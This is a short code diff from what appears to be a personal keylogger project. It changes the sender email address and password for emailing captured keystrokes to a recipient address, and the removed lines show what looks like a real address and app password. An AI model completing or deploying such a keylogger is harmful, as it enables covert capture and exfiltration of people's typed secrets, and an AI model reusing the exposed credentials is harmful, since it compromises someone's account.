@@ -33,8 +33,8 @@ import os
 keys_information = "key_log.txt" 
 file_path = "/Users/amartin/Desktop/cyber_Projects/keylogger/key_log.txt"
 
-email_addr = "blkshyguy0o0@gmail.com"
-password = "bsky limo dtcv tdjf"
+email_addr = "plurals.hull.0x@server.com"
+password = "bsky*limo*dtcv*tdjf"
 
 toaddr = "blkshyguy0o0@gmail.com"
 
